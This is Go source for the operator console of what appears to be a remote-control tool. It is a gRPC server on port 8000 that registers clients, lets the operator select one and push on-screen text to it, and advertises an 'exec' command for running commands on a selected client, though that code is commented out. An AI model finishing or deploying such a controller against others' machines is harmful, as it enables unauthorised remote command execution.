package main

import (
	"encoding/json"
	"log"
	"net"
	"os"
	"strings"

	pb "github.com/Xart3mis/GoHkarComms/client_data_pb"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/fatih/color"
	"github.com/magodo/textinput"

	"golang.org/x/net/context"
	"google.golang.org/grpc"
)

type server struct {
	pb.ConsumerServer
}

var client_onscreentext map[string]string = make(map[string]string)

// var client_execcommand map[string]*pb.ClientExecData = make(map[string]*pb.ClientExecData)
// var client_execoutput map[string]*pb.ClientExecOutput = make(map[string]*pb.ClientExecOutput)

var client_ids []string
var current_id string = ""

// var command_out chan string = make(chan string, 1)

func main() {
	go func() {
		p := tea.NewProgram(initialModel(), tea.WithAltScreen())

		if err := p.Start(); err != nil {
			log.Fatal(err)
		}
	}()

	s := grpc.NewServer()
	lis, err := net.Listen("tcp", "0.0.0.0:8000")
	if err != nil {
		log.Fatalf("Failed to listen: %v", err)
	}

	pb.RegisterConsumerServer(s, &server{})

	err = s.Serve(lis)
	if err != nil {
		log.Fatalf("Failed to serve: %v", err)
	}

}

func (s *server) RegisterClient(ctx context.Context, in *pb.ClientDataRequest) (*pb.RegisterResponse, error) {
	client_ids = append(client_ids, in.ClientId)
	return &pb.RegisterResponse{Status: 0}, nil
}

func Contains(sl []string, name string) bool {
	for _, value := range sl {
		if value == name {
			return true
		}
	}
	return false
}

func (s *server) GetExecCommand(ctx context.Context, in *pb.ClientDataRequest) (*pb.ClientExecData, error) {
	// showout = false
	// if client_execcommand[in.ClientId] != nil {
	// 	return &pb.ClientExecData{ShouldExec: true,
	// 		Command: client_execcommand[in.ClientId].Command}, nil
	// } else {
	return &pb.ClientExecData{}, nil
	// }
}

func (s *server) SetExecOutput(ctx context.Context, in *pb.ClientExecOutput) (*pb.Void, error) {
	// showout = true
	// command_out <- in.Output
	return &pb.Void{}, nil
}

func (s *server) SubscribeOnScreenText(r *pb.ClientDataRequest, in pb.Consumer_SubscribeOnScreenTextServer) error {
	for {
		if r.ClientId == current_id {
			in.Send(&pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
				ShouldUpdate: len(client_onscreentext[current_id]) > 0,
				OnScreenText: client_onscreentext[current_id]}})
		}
	}
}

type model struct {
	textInput      textinput.Model
	typing         bool
	showhelplist   bool
	showclientlist bool
	showoutput     bool
	err            error
	clients        []string
}

var showout bool = false

func initialModel() model {
	ti := textinput.NewModel()
	ti.Placeholder = "help"

	red := color.New(color.FgRed).SprintFunc()
	ti.Prompt = red(">> ")
	ti.PromptStyle.Bold(true)

	ti.PromptStyle.PaddingRight(10)
	ti.Focus()
	ti.CharLimit = 156
	ti.Width = 20

	ti.CandidateWords = []string{"help", "settext", "select", "exit", "exec", "list_clients"}
	ti.CandidateViewMode = textinput.CandidateViewHorizental

	return model{
		textInput:      ti,
		err:            nil,
		typing:         true,
		showhelplist:   false,
		showclientlist: false,
		showoutput:     false,
		clients:        client_ids,
	}
}

func (m model) Init() tea.Cmd {
	return textinput.Blink
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmd tea.Cmd
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c":
			os.Exit(0)
			return m, tea.Quit

		case "esc", "q":
			m.showhelplist = false
			m.showclientlist = false
			m.showoutput = false
			showout = false
			return m, nil

		case "enter":
			m.clients = client_ids
			// if len(m.textInput.Value()) > 4 && m.textInput.Value()[:4] == "exec" {
			// 	split_str := strings.Split(m.textInput.Value(), " ")
			// 	client_execcommand[current_id] = &pb.ClientExecData{ShouldExec: true, Command: strings.Join(split_str[1:], " ")}
			// 	m.showoutput = true
			// }

			if len(m.textInput.Value()) > 6 && m.textInput.Value()[:6] == "select" {
				split_str := strings.Split(m.textInput.Value(), " ")
				if len(split_str) > 2 {
					panic("select only takes 1 argument")
				}
				current_id = split_str[1]
			}

			if len(m.textInput.Value()) > 7 && m.textInput.Value()[:7] == "settext" {
				split_str := strings.Split(m.textInput.Value(), " ")
				client_onscreentext[current_id] = strings.Join(split_str[1:], " ")
			}

			switch m.textInput.Value() {
			case "help":
				m.showhelplist = true
				return m, nil
			case "exit":
				return m, tea.Quit
			case "list_clients":
				m.showclientlist = true
				return m, nil
			default:
				return m, nil
			}
		}
	case error:
		m.err = msg
		return m, nil
	}

	m.textInput, cmd = m.textInput.Update(msg)
	return m, cmd

}

func (m model) View() string {
	if m.showhelplist {
		yellow := color.New(color.FgYellow).SprintFunc()
		green := color.New(color.FgGreen).SprintFunc()

		return m.textInput.View() + "\n\n" + green("help") + "\nshow this help dialog (usage: " + yellow("help") + ")\n\n" +
			green("select") + "\nselect a client to connect to (usage: " + yellow("select [`client id`]") + ")\n\n" +
			green("exit") + "\nexit the server (usage: " + yellow("exit") + ")\n\n" +
			green("settext") + "\nset on screen text for selected client (usage: " + yellow("settext [`text`]") + ")\n\n" +
			green("exec") + "\nexecute command on selected client (usage: " + yellow("exec [`command string`]") + ")\n\n" +
			green("list_clients") + "\nlist currently connected clients (usage: " + yellow("list_clients [client id]") + ")\n"
	}
	if m.showclientlist {
		Magenta := color.New(color.FgMagenta).SprintFunc()
		b, _ := json.MarshalIndent(m.clients, "", "\t")
		return m.textInput.View() + "\n\n" + Magenta(string(b))
	}
	// if showout {
	// 	return m.textInput.View() + "\n\n" + <-command_out
	// }

	return m.textInput.View()
}
